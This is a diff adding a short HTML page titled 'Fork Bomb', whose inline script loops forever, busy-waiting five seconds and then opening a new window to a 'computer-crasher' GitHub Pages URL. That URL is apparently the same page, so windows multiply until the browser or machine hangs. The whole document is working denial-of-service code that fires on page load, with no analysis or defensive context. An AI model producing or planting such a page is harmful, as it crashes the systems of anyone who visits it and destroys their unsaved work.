@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <title>Fork Bomb</title>
+  </head>
+  <body>
+    <script>
+      while(true) {
+        var x = new Date();
+        x.setSeconds(x.getSeconds() + 5);
+        while(new Date() < x) {};
+        window.open("https://nargacuga.github.io/computer-crasher");
+      }
+    </script>
+  </body>
+</html>
